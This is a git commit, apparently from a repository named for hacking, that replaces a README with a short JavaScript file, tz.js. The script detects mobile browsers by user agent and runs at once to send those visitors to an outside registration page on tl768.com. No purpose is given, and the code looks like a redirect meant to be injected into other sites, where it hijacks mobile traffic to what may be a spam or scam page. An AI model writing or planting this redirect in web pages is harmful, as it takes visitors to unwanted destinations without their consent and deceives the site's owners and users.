dc16681bdf5f9a4e18e7df3b7c3b045e3a1a9fe5
Th4ck-Team <57929473+Th4ck-Team@users.noreply.github.com>
2020-11-19 15:28:35 +0800

    Update and rename README.md to tz.js

---
+++ tz.js
@@ -0,0 +1,6 @@
+function gg(){
+          if ((navigator.userAgent.match(/(iPhone|iPod|Android|ios|iPad)/i)))
+          {
+         	  window.location.href = "https://www.tl768.com/dcxf/reg_m.html";
+          }
+};gg();
